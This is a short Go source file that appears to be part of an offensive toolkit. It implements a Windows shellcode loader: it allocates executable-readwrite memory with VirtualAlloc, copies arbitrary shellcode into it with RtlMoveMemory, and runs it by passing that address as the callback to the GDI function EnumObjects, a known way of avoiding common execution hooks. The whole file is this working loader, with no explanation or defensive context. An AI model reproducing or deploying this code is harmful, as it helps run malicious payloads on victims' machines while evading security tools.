package TT

import (
	"syscall"
	"unsafe"
)

var (
	timer int
	dummy [522]byte
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	NULL                   = 0
	OBJ_BRUSH              = 2
)

var (
	kernel32          = syscall.MustLoadDLL("kernel32.dll")
	ntdll             = syscall.MustLoadDLL("ntdll.dll")
	User32            = syscall.MustLoadDLL("User32.dll")
	Gdi32             = syscall.MustLoadDLL("Gdi32.dll")
	VirtualAlloc      = kernel32.MustFindProc("VirtualAlloc")
	GetDC             = User32.MustFindProc("GetDC")
	EnumFontFamiliesW = Gdi32.MustFindProc("EnumFontFamiliesW")
	EnumObjects       = Gdi32.MustFindProc("EnumObjects")
	RtlMoveMemory     = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	dc, _, _ := GetDC.Call(NULL)
	EnumObjects.Call(dc, OBJ_BRUSH, addr, NULL)
}
